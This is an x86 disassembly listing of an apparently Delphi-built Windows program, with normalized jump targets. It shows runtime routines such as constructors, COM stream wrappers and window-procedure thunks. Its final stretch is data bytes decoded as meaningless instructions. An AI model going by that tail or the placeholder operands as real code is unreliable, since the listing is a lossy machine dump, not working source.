call sub_41a19c
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_40800c
test al al
jne r-xdata
sub_420094
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404378
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408190
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
xor edx edx
mov eax ebx
call sub_420214
mov edx esi
mov eax ebx
call sub_420120
mov dl 0x1
mov eax ebx
call sub_420214
sub_420134
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a19c
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a128
sub_420170
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41a1f8
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a08c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41a218
sub_4201c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420160
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420134
mov cl 0x1
mov edx ebx
call sub_4201c4
inc edi
dec ebp
jne r-xdata
sub_420214
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404208
mov edx esp
mov eax esi
call sub_4034f0
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_42025c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420284
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4202cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42030c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_42032c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_420350
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_420398
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
mov edx esi
call sub_4205c8
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_420400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4205c8
mov edx ebx
mov eax esi
call sub_4205bc
sub_420444
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fb3c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_420488
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fb88
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41fe3c
jmp r-xdata
mov eax esi
call sub_41a284
mov edx eax
mov eax edi
call sub_4205c8
lea eax [ edi + 0x50 ]
call sub_40d3ac
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_4204e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41fe58
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_420514
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_420530
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42054c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_41a19c
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4205c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a08c
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a19c
cmp ebp eax
jne r-xdata
sub_420608
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41fe3c
mov edx ebx
call sub_41fc0c
sub_420634
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42067c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_40321c
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4206b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420703
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42071c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42076b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420784
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4207ee
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_420808
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_420851
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41be60
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42086c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405a10
xor eax eax
push ebp
push sub_420a59
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_420a32
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40278c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_420a21
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027ac
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a60
lea eax [ ebp + 0xc ]
call sub_40599c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_420a9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_420aff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420b30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_41a508
mov edi eax
xor eax eax
push ebp
push sub_420b85
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b8c
mov eax [ rw-data ]
call sub_41a56c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a19c
call sub_40321c
inc esi
dec ebx
jne r-xdata
sub_420ba4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_420bcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402988
mov edx sub_420ba4
lea eax [ esi + 0x5 ]
call sub_420bc4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_420bc4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_420c88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d18
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420bcc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_420d3c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_420c64
sub_420d64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_420e08
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420e0f
retn
mov eax [ rw-data ]
call sub_41998c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_420b30
xor edx edx
xor eax eax
call sub_41cd60
mov eax rw-data
call sub_40d3ac
call sub_4060cc
lea eax [ eax + 0xc ]
call sub_40d3ac
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_40599c
mov eax sub_420b9c
call sub_405838
mov eax rw-data
call sub_40d3ac
call sub_41f95c
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_40599c
sub_420e14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_420e9d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ea4
retn
call sub_41f928
mov eax sub_420b9c
call sub_405830
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d0ec
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4059b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_419288
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a3b0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a3b0
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_420ea8
push 0x71004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ esi ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi ] dh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ eax ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ esi ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi ] bh
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ eax ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ecx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx ] ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ edi + edi * 8 ] ah
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42116d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421174
retn
sub_421184
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
in al 0x11
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
adc [ edx ] eax
or al 0x0
add [ eax ] al
js r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
